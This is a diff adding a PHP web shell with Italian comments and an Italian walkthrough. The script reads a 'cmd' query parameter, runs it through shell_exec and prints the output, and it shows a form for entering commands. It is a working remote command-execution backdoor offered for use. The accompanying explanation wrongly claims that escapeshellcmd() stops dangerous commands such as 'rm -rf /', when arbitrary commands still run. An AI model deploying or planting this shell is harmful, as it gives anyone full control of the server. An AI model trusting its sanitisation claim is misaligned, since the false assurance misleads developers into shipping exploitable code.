@@ -1,0 +1,46 @@
+<?php
+// Funzione per pulire l'input e prevenire comandi pericolosi
+function clean_input($input) {
+    return escapeshellcmd(trim($input));
+}
+
+// Funzione per eseguire comandi e restituire l'output
+function execute_command($cmd) {
+    $output = shell_exec($cmd);
+    return $output ? $output : "Errore nell'esecuzione del comando";
+}
+
+// Se il parametro 'cmd' è presente, esegui il comando
+if(isset($_GET['cmd'])) {
+    $cmd = clean_input($_GET['cmd']);  // Pulisce l'input
+    $result = execute_command($cmd);   // Esegue il comando
+    echo "<pre>$result</pre>";         // Mostra l'output in formato leggibile
+}
+
+// Mostra una semplice interfaccia per l'inserimento di comandi
+else {
+    echo "<h3>Benvenuto nella Shell PHP</h3>";
+    echo "<form method='GET'>
+            <input type='text' name='cmd' placeholder='Inserisci il comando'>
+            <input type='submit' value='Esegui'>
+          </form>";
+}
+?>
+
+
+
+. Sanificazione dell'input:
+La funzione clean_input($input) serve per pulire l'input dell'utente, rimuovendo caratteri pericolosi tramite escapeshellcmd(). Questo aiuta a evitare l'esecuzione di comandi malformati o pericolosi che potrebbero compromettere il sistema (ad esempio, la possibilità di eseguire comandi come ; rm -rf /).
+- Esecuzione del comando:
+La funzione execute_command($cmd) esegue il comando fornito tramite la funzione shell_exec(). Questa funzione restituisce l'output del comando eseguito. Se non c'è output, la funzione restituirà un messaggio di errore.
+Interfaccia di comando:
+Se il parametro cmd non è presente nell'URL, il programma visualizza un modulo HTML che permette all'utente di inserire un comando. Quando il modulo viene inviato, il comando viene eseguito tramite il parametro cmd passato via GET.
+Visualizzazione dei risultati:
+L'output del comando eseguito viene mostrato all'interno di un blocco <pre>, che consente di visualizzare i risultati in un formato leggibile (con la formattazione e l'indentazione adeguata).
+Flusso di esecuzione:
+Quando un utente accede allo script senza un parametro cmd, viene visualizzato un modulo HTML.
+L'utente inserisce un comando nel campo di testo e lo invia.
+Il comando viene preso come parametro cmd nella query string dell'URL, ad esempio: shell.php?cmd=ls.
+Il comando inserito viene "pulito" dalla funzione clean_input() per evitare caratteri potenzialmente pericolosi.
+La funzione execute_command() esegue il comando e restituisce l'output.
+L'output del comando viene visualizzato nel browser.
